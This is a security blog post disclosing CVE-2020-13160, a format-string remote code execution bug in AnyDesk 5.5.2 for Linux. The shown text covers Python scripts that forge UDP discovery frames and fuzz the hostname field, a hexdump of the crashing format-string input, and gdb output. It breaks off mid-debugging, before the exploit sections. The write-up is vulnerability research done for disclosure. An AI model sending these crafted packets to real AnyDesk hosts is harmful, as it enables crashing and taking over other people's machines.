<!DOCTYPE html>
<html lang="en-US" class="no-js no-svg">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="https://gmpg.org/xfn/11">

<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
<title>AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160) &#8211; devel0pment.de</title>
<meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
<link rel="alternate" type="application/rss+xml" title="devel0pment.de &raquo; Feed" href="https://devel0pment.de/?feed=rss2" />
<link rel="alternate" type="application/rss+xml" title="devel0pment.de &raquo; Comments Feed" href="https://devel0pment.de/?feed=comments-rss2" />
<link rel="alternate" type="application/rss+xml" title="devel0pment.de &raquo; AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160) Comments Feed" href="https://devel0pment.de/?feed=rss2&#038;p=1881" />
		<script>
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/devel0pment.de\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.8.1"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([10084,65039,8205,55357,56613],[10084,65039,8203,55357,56613])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style>
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='wp-block-library-css'  href='https://devel0pment.de/wp-includes/css/dist/block-library/style.min.css?ver=5.8.1' media='all' />
<style id='wp-block-library-theme-inline-css'>
#start-resizable-editor-section{display:none}.wp-block-audio figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio figcaption{color:hsla(0,0%,100%,.65)}.wp-block-code{font-family:Menlo,Consolas,monaco,monospace;color:#1e1e1e;padding:.8em 1em;border:1px solid #ddd;border-radius:4px}.wp-block-embed figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed figcaption{color:hsla(0,0%,100%,.65)}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:hsla(0,0%,100%,.65)}.wp-block-image figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-image figcaption{color:hsla(0,0%,100%,.65)}.wp-block-pullquote{border-top:4px solid;border-bottom:4px solid;margin-bottom:1.75em;color:currentColor}.wp-block-pullquote__citation,.wp-block-pullquote cite,.wp-block-pullquote footer{color:currentColor;text-transform:uppercase;font-size:.8125em;font-style:normal}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;position:relative;font-style:normal}.wp-block-quote.has-text-align-right{border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote.has-text-align-center{border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large{border:none}.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-group.has-background{padding:1.25em 2.375em;margin-top:0;margin-bottom:0}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto;opacity:.4}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table thead{border-bottom:3px solid}.wp-block-table tfoot{border-top:3px solid}.wp-block-table td,.wp-block-table th{padding:.5em;border:1px solid;word-break:normal}.wp-block-table figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table figcaption{color:hsla(0,0%,100%,.65)}.wp-block-video figcaption{color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video figcaption{color:hsla(0,0%,100%,.65)}.wp-block-template-part.has-background{padding:1.25em 2.375em;margin-top:0;margin-bottom:0}#end-resizable-editor-section{display:none}
</style>
<link rel='stylesheet' id='dashicons-css'  href='https://devel0pment.de/wp-includes/css/dashicons.min.css?ver=5.8.1' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://devel0pment.de/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.7' media='all' />
<link rel='stylesheet' id='twentyseventeen-fonts-css'  href='https://fonts.googleapis.com/css?family=Libre+Franklin%3A300%2C300i%2C400%2C400i%2C600%2C600i%2C800%2C800i&#038;subset=latin%2Clatin-ext&#038;display=fallback' media='all' />
<link rel='stylesheet' id='twentyseventeen-style-css'  href='https://devel0pment.de/wp-content/themes/twentyseventeen/style.css?ver=20201208' media='all' />
<link rel='stylesheet' id='twentyseventeen-block-style-css'  href='https://devel0pment.de/wp-content/themes/twentyseventeen/assets/css/blocks.css?ver=20190105' media='all' />
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentyseventeen-ie8-css'  href='https://devel0pment.de/wp-content/themes/twentyseventeen/assets/css/ie8.css?ver=20161202' media='all' />
<![endif]-->
<!--[if lt IE 9]>
<script src='https://devel0pment.de/wp-content/themes/twentyseventeen/assets/js/html5.js?ver=20161020' id='html5-js'></script>
<![endif]-->
<script src='https://devel0pment.de/wp-includes/js/jquery/jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
<script src='https://devel0pment.de/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<link rel="https://api.w.org/" href="https://devel0pment.de/index.php?rest_route=/" /><link rel="alternate" type="application/json" href="https://devel0pment.de/index.php?rest_route=/wp/v2/posts/1881" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://devel0pment.de/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://devel0pment.de/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.8.1" />
<link rel="canonical" href="https://devel0pment.de/?p=1881" />
<link rel='shortlink' href='https://devel0pment.de/?p=1881' />
<link rel="alternate" type="application/json+oembed" href="https://devel0pment.de/index.php?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=https%3A%2F%2Fdevel0pment.de%2F%3Fp%3D1881" />
<link rel="alternate" type="text/xml+oembed" href="https://devel0pment.de/index.php?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=https%3A%2F%2Fdevel0pment.de%2F%3Fp%3D1881&#038;format=xml" />
<link rel="pingback" href="https://devel0pment.de/xmlrpc.php">
<style>.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
		<style type="text/css">
			#wp-admin-bar-pvc-post-views .pvc-graph-container { padding-top: 6px; padding-bottom: 6px; position: relative; display: block; height: 100%; box-sizing: border-box; }
			#wp-admin-bar-pvc-post-views .pvc-line-graph {
				display: inline-block;
				width: 1px;
				margin-right: 1px;
				background-color: #ccc;
				vertical-align: baseline;
			}
			#wp-admin-bar-pvc-post-views .pvc-line-graph:hover { background-color: #eee; }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-0 { height: 1% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-1 { height: 5% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-2 { height: 10% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-3 { height: 15% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-4 { height: 20% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-5 { height: 25% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-6 { height: 30% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-7 { height: 35% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-8 { height: 40% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-9 { height: 45% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-10 { height: 50% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-11 { height: 55% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-12 { height: 60% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-13 { height: 65% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-14 { height: 70% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-15 { height: 75% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-16 { height: 80% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-17 { height: 85% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-18 { height: 90% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-19 { height: 95% }
			#wp-admin-bar-pvc-post-views .pvc-line-graph-20 { height: 100% }
		</style>		<style id="wp-custom-css">
			@media screen and (min-width: 48em) {
	
	.wrap {
		max-width:100%;
	}
	
	.has-sidebar:not(.error404) #primary {
			float: left;
			width: 73%;
		}

	.has-sidebar #secondary {
		float: right;
		padding-top: 0;
		width: 21%;
	}
}

.site-branding-text {
	font-family:Consolas;
}

.site-title {
	text-transform:none;
}		</style>
		</head>

<body class="post-template-default single single-post postid-1881 single-format-standard wp-embed-responsive has-header-image has-sidebar colors-light">
<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	<header id="masthead" class="site-header" role="banner">

		<div class="custom-header">

		<div class="custom-header-media">
			<div id="wp-custom-header" class="wp-custom-header"><img src="https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png" width="2000" height="1200" alt="devel0pment.de" srcset="https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png 2000w, https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05-300x180.png 300w, https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05-768x461.png 768w, https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05-1024x614.png 1024w" sizes="100vw" /></div>		</div>

	<div class="site-branding">
	<div class="wrap">

		
		<div class="site-branding-text">
							<p class="site-title"><a href="https://devel0pment.de/" rel="home">devel0pment.de</a></p>
			
							<p class="site-description">hacking, software, it-security</p>
					</div><!-- .site-branding-text -->

		
	</div><!-- .wrap -->
</div><!-- .site-branding -->

</div><!-- .custom-header -->

		
	</header><!-- #masthead -->

	
	<div class="site-content-contain">
		<div id="content" class="site-content">

<div class="wrap">
	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

			
<article id="post-1881" class="post-1881 post type-post status-publish format-standard hentry category-article tag-cve-2020-13160 tag-exploitation tag-formatstring tag-fuzzing tag-rce">
		<header class="entry-header">
		<div class="entry-meta"><span class="posted-on"><span class="screen-reader-text">Posted on</span> <a href="https://devel0pment.de/?p=1881" rel="bookmark"><time class="entry-date published" datetime="2020-06-09T04:06:17+00:00">9. June 2020</time><time class="updated" datetime="2020-06-15T12:54:21+00:00">15. June 2020</time></a></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="https://devel0pment.de/?author=1">scryh</a></span></span></div><!-- .entry-meta --><h1 class="entry-title">AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)</h1>	</header><!-- .entry-header -->

	
	<div class="entry-content">
		
<figure class="wp-block-image size-full is-resized"><img loading="lazy" src="https://devel0pment.de/wp-content/uploads/2020/06/cve.png" alt="" class="wp-image-2001" width="750" height="150" srcset="https://devel0pment.de/wp-content/uploads/2020/06/cve.png 750w, https://devel0pment.de/wp-content/uploads/2020/06/cve-300x60.png 300w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px" /></figure>



<p>One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application <a rel="noreferrer noopener" href="https://anydesk.com/" target="_blank">AnyDesk</a>, which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as <a rel="noreferrer noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160" target="_blank">CVE-2020-13160</a>. Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:</p>



→ <a href="https://devel0pment.de/?p=1881#fuzzing">Fuzzing</a><br>
→ <a href="https://devel0pment.de/?p=1881#bug">Bug</a><br>
→ <a href="https://devel0pment.de/?p=1881#exploit">Exploit</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&#8211; <a href="https://devel0pment.de/?p=1881#strategy">Strategy</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&#8211; <a href="https://devel0pment.de/?p=1881#vsnprintf">The v in vsnprintf</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&#8211; <a href="https://devel0pment.de/?p=1881#write">Gaining arbitrary write</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&#8211; <a href="https://devel0pment.de/?p=1881#ip">Controlling the instruction pointer</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&#8211; <a href="https://devel0pment.de/?p=1881#shellcode">Hitting our shellcode: dynamic field width</a><br>
&nbsp;&nbsp;&nbsp;&nbsp;&#8211; <a href="https://devel0pment.de/?p=1881#final">Final exploit</a><br>
→ <a href="https://devel0pment.de/?p=1881#conclusion">Conclusion</a><br><br>



<span id="more-1881"></span>



<hr>



<h1 id="fuzzing">Fuzzing</h1>



<p>The AnyDesk application is running multiple processes with different permissions. The most valuable target is the service process <code>/usr/bin/anydesk --service</code>, since this process is running with <code>root</code> privileges. There are two older CVEs (<a rel="noreferrer noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14397" target="_blank">CVE-2017-14397</a> and <a rel="noreferrer noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13102" target="_blank">CVE-2018-13102</a>), which target this process on Windows in order to escalate privileges. Both of these exploits are DLL injection/preloading vulnerabilities, which only work locally. My desire was to find a vulnerability, which can be exploited remotely.</p>



<p>At first we need to figure out which remote communication with the AnyDesk application is possible. This can simply be done by starting the application and using <code>netstat</code> to determine on which ports the application is listening:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
user@w00d:~$ sudo netstat -tulpn | grep anydesk        
tcp        0      0 0.0.0.0:7070            0.0.0.0:*               LISTEN      598/anydesk         
udp        0      0 0.0.0.0:50001           0.0.0.0:*                           598/anydesk   
</pre></div>


<p>Accordingly the application is listening on TCP port <code>7070</code> and UDP port <code>50001</code>. By displaying all anydesk processes, we can see that the listening process is the service process itself (PID <code>598</code>). Also recognize the traybar process (PID <code>2983</code>) as well as the front-end process (PID <code>3421</code>):</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
user@w00d:~$ sudo ps aux | grep anydesk
root       598  0.0  0.3 531172 28620 ?        Ssl  08:56   0:02 /usr/bin/anydesk --service
user      2983  0.0  0.2 744288 23736 tty2     Sl+  08:58   0:00 /usr/bin/anydesk --tray
user      3421  0.0  0.4 864624 37760 tty2     Sl+  09:01   0:00 /usr/bin/anydesk
</pre></div>


<p>Before we can reasonably fuzz the application, we have to determine what data the application is usually expecting to receive on these ports. In order to get some sample data, we can inspect all traffic related to these ports using <code>wireshark</code> while interacting with the application.</p>



<p>According to the observations we can make with wireshark TCP port 7070 is used for the actual remote desktop connection and uses TLS to encrypt the traffic. The details are not relevant for our considerations here. The relevant port is UDP 50001, which is used to announce AnyDesk clients within a local network. On startup of AnyDesk we can see that our client sends UDP packets to <code>239.255.102.18</code> in order to announce its presence. The packet contains the hostname (<code>w00d</code>), the username (<code>scryh</code>), a profile picture as well as a few other information:</p>



<p><img loading="lazy" width="910" height="593" src="https://devel0pment.de/wp-content/uploads/2020/05/anyd_01.png" alt=""></p>



<p>Assuming that these announcements are also processed by our own client, we now have some legitimate data in order to fuzz the application. At first I started by fuzzing the application using <a rel="noreferrer noopener" href="https://github.com/denandz/fuzzotron" target="_blank">fuzzotron</a>, which is written in C and is quite fast. fuzzotron uses <a rel="noreferrer noopener" href="https://gitlab.com/akihe/radamsa" target="_blank">radamsa</a> and/or <a rel="noreferrer noopener" href="https://github.com/aoh/blab" target="_blank">blab</a> for the mutation of the input data. The setup is straightforward. We simply put our initial data observed in wireshark in a test-case file and then run fuzzotron providing among others the IP address and port as well as the PID, which fuzzotron should monitor for possible crashes.</p>



<p>Unfortunately I could not find any flaws that seemed to be exploitable. So I decided to change the approach. Instead of directly targeting the service process, which is listening on the network socket, we can focus on the front-end process (PID <code>2983</code> in the output above). The front-end process is responsible for displaying the GUI to the user and communicates with the service process to exchange information relevant for the GUI. When the service process receives a valid UDP announcement frame this frame is passed to the front-end process in order to display the announced device within the GUI:</p>



<p><img loading="lazy" width="796" height="466" src="https://devel0pment.de/wp-content/uploads/2020/05/anyd_02.png" alt=""></p>



<p>To make our fuzzing input reach the front-end process we have to send valid announcement frames. The problem here is that most of the frames produced by the fuzzer we used so far are not valid, because there are mutated without any knowledge of the specific format of these frames. Accordingly most of the fuzzer-mutated frames are dropped by the service process and never reach the front-end process.</p>



<p>In order to create valid announcement frames we have to understand how the frames are built. Fortunately the format is not very complicated. By changing settings like our username or hostname and then observing the corresponding announcement frames our client is sending, we can derive how the frames are built. Among other things a frame contains the AnyDesk ID (4-byte), an operating system ID (1-byte) as well as the hostname and username, which are both transmitted as a 4-byte length field (<code>big-endian</code>) followed by the actual data. There are a few other fields and static values, which are not relevant for our considerations. The following python script creates a valid frame based on the given parameters and sends it to our local machine on UDP port 50001:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: python; title: ; notranslate" title="">
#!/usr/bin/env python

import struct
import socket

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('&gt;I', ad_id)
  d += struct.pack('&gt;I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('&gt;I', len(hn)) + hn
  d += struct.pack('&gt;I', len(user)) + user
  d += struct.pack('&gt;I', 0)
  d += struct.pack('&gt;I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('&gt;I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

p = gen_discover_packet(4919, 1, 'custom host', 'custom username', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
</pre></div>


<p>After running the script we can see in the GUI that the front-end received the announcement and the fake device is displayed:</p>



<p><img loading="lazy" width="626" height="461" src="https://devel0pment.de/wp-content/uploads/2020/05/anyd_03.png" alt=""></p>



<p>Now we are ready to explicitly fuzz certain fields of the frame. In order to do this we extend the python script to serve as our fuzzer. We can generate the actual fuzzing input by using radamsa again. Also we will monitor the front-end process and dump the last 10 fuzzing inputs, if the process died. The full fuzzer script, which targets the hostname, looks like this:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: python; title: ; notranslate" title="">
#!/usr/bin/env python

import struct
import socket
import subprocess
import psutil
import os
import time

ip = '127.0.0.1'
port = 50001
host_payloads = &#91;''] * 10
dump_idx = 0


def mutate(pl):
  p = subprocess.Popen(&#91;'/usr/bin/radamsa', '-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
  return p.communicate(pl)&#91;0]


def isAlive():
  for p in psutil.process_iter():
    if (p.name() == 'anydesk' and len(p.cmdline()) == 1): return True
  return False


def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('&gt;I', ad_id)
  d += struct.pack('&gt;I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('&gt;I', len(hn)) + hn
  d += struct.pack('&gt;I', len(user)) + user
  d += struct.pack('&gt;I', 0)
  d += struct.pack('&gt;I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('&gt;I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d


def dump():
  global dump_idx
  print('dumping '+str(dump_idx))
  os.system('mkdir loot'+str(dump_idx))
  for i in range(len(host_payloads)):
    f = open('./loot'+str(dump_idx)+'/host_payload'+str(i), 'wb')
    f.write(host_payloads&#91;i])
    f.close()
  dump_idx += 1
  os.system('anydesk&amp;')
  time.sleep(5)


idx = 0
while True:
  time.sleep(5.0)
  host = mutate('host')
  if (len(host) &gt; 45000): continue # max length
  host_payloads&#91;idx%len(host_payloads)] = host
  p = gen_discover_packet(4919, 2, host, 'user', 'ad', 'main')
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.sendto(p, (ip, port))
  s.close()
  idx += 1
  if (not isAlive()): dump()
</pre></div>


<p>The sleep time for each fuzzing iteration is quite high (5 seconds), but it turned out that the GUI is only updated every 5 seconds. At first I thought about patching the binary in order to increase the update interval, but before digging into this I decided to just let the fuzzer run over a night.</p>



<p>At the next day the fuzzing results were ready to be evaluated. The front-end actually crashed a few times and the script stored the fuzzing inputs on disk. At first we need to determine which exact payload triggered the crash. Since we saved the last 10 payloads sent to the application, we just need to resend these payloads and determine which one makes the application crash. This can be done using the following script:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: python; title: ; notranslate" title="">
#!/usr/bin/env python

import struct
import socket
import sys

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  ...

host = open(sys.argv&#91;1]).read()
p = gen_discover_packet(4919, 2, host, 'user', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
</pre></div>


<p>By sending the following payload the front-end crashes:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
user@w00d:~$ ./resend.py loot2/host_payload4

... crash ...

user@w00d:~$ hexdump -C loot2/host_payload4
00000000  61 61 61 61 25 64 25 6e  25 70 25 64 24 2b f3 a0  |aaaa%d%n%p%d$+..|
00000010  81 9c 81 bd 0b 7c                                 |.....||
00000016
</pre></div>


<p>By fuzzing the AnyDesk front-end process with a python script, which produces valid announcement frames and mutates the hostname using radamsa, we successfully generated an input, which crashes the application. The next step is to analyze the bug in order the determine, if we can exploit it.</p>



<h1 id="bug">Bug</h1>



<p>So far we have fuzzed the AnyDesk front-end and identified an input which makes the front-end crash. The next step is to determine what the cause of this crash is and to examine if it is based on a bug which we can exploit.</p>



<p>At first we start up the front-end again and attach gdb to it (the <code>pid_frontend.py</code> script merely retrieves the current <code>PID</code> of the front-end process):</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; highlight: [1,5,60]; title: ; notranslate" title="">
root@w00d:~# gdb /usr/bin/anydesk $(~/pid_frontend.py)

...
Reading symbols from /usr/bin/anydesk...(no debugging symbols found)...done.
Attaching to program: /usr/bin/anydesk, process 10911
&#91;New LWP 10913]
&#91;New LWP 10914]
&#91;New LWP 10928]
&#91;New LWP 10931]
&#91;New LWP 10938]
&#91;New LWP 10941]
&#91;New LWP 10942]
&#91;New LWP 10943]
&#91;New LWP 10944]
&#91;New LWP 10945]
&#91;Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.

&#91;----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffdfc 
RBX: 0x1cf7720 --&gt; 0x100000005 
RCX: 0x7f491870ebf9 (&lt;__GI___poll+73&gt;:	cmp    rax,0xfffffffffffff000)
RDX: 0x37a0 
RSI: 0x3 
RDI: 0x1cf7720 --&gt; 0x100000005 
RBP: 0x3 
RSP: 0x7ffe12cbcfb0 --&gt; 0x1aa05cc --&gt; 0x2 
RIP: 0x7f491870ebf9 (&lt;__GI___poll+73&gt;:	cmp    rax,0xfffffffffffff000)
R8 : 0x0 
R9 : 0x1ab6720 --&gt; 0x1900000024 
R10: 0x1ce3000 --&gt; 0x1ab6720 --&gt; 0x1900000024 
R11: 0x293 
R12: 0x37a0 
R13: 0x37a0 
R14: 0x7f491d0b9f70 (&lt;g_poll&gt;:	mov    esi,esi)
R15: 0x3
EFLAGS: 0x293 (CARRY parity ADJUST zero SIGN trap INTERRUPT direction overflow)
&#91;-------------------------------------code-------------------------------------]
   0x7f491870ebef &lt;__GI___poll+63&gt;:	mov    rdi,rbx
   0x7f491870ebf2 &lt;__GI___poll+66&gt;:	mov    eax,0x7
   0x7f491870ebf7 &lt;__GI___poll+71&gt;:	syscall 
=&gt; 0x7f491870ebf9 &lt;__GI___poll+73&gt;:	cmp    rax,0xfffffffffffff000
   0x7f491870ebff &lt;__GI___poll+79&gt;:	ja     0x7f491870ec32 &lt;__GI___poll+130&gt;
   0x7f491870ec01 &lt;__GI___poll+81&gt;:	mov    edi,r8d
   0x7f491870ec04 &lt;__GI___poll+84&gt;:	mov    DWORD PTR &#91;rsp+0xc],eax
   0x7f491870ec08 &lt;__GI___poll+88&gt;:	call   0x7f491872a740 &lt;__libc_disable_asynccancel&gt;
&#91;------------------------------------stack-------------------------------------]
0000| 0x7ffe12cbcfb0 --&gt; 0x1aa05cc --&gt; 0x2 
0008| 0x7ffe12cbcfb8 --&gt; 0x1cf7720 --&gt; 0x100000005 
0016| 0x7ffe12cbcfc0 --&gt; 0x1957be0 --&gt; 0x0 
0024| 0x7ffe12cbcfc8 --&gt; 0x3 
0032| 0x7ffe12cbcfd0 --&gt; 0x1cf7720 --&gt; 0x100000005 
0040| 0x7ffe12cbcfd8 --&gt; 0x7f491d0aa5c9 (mov    r13d,eax)
0048| 0x7ffe12cbcfe0 --&gt; 0x0 
0056| 0x7ffe12cbcfe8 --&gt; 0x101957be0 
&#91;------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00007f491870ebf9 in __GI___poll (fds=0x1cf7720, nfds=0x3, timeout=0x37a0) at ../sysdeps/unix/sysv/linux/poll.c:29
29	../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
gdb-peda$ c
Continuing.
</pre></div>


<p>Now we resend the payload, which caused the crash:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
user@w00d:~$ ./resend.py loot2/host_payload4
</pre></div>


<p>As expected the application raises a segmentation fault:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; gutter: false; highlight: [1,4,26,42]; title: ; notranslate" title="">
Thread 1 &quot;anydesk&quot; received signal SIGSEGV, Segmentation fault.

&#91;----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x7ffe12cbb800 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'&quot;)
RCX: 0x0 
RDX: 0x7ffe12cbc4f8 --&gt; 0x0 
RSI: 0x7ffe12cbb568 --&gt; 0xd24f18983b49a900 
RDI: 0x7ffe12cbb5b0 --&gt; 0x7ffefbad8001 
RBP: 0x7ffe12cbb5a0 --&gt; 0x7ffe12cbbc00 (&quot;Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa30849456\275\313\022\376\177&quot;)
RSP: 0x7ffe12cbb030 --&gt; 0x7f491ec3a6f0 (&lt;gtk_widget_destroy&gt;:	push   rbx)
RIP: 0x7f4918657932 (&lt;_IO_vfprintf_internal+9634&gt;:	mov    DWORD PTR &#91;rax],r13d)
R8 : 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x7ffe12cbb88c --&gt; 0xf32b24642570256e 
R12: 0x7ffe12cbc4c8 --&gt; 0x3000000020 (' ')
R13: 0x91 
R14: 0x7ffe12cbb5b0 --&gt; 0x7ffefbad8001 
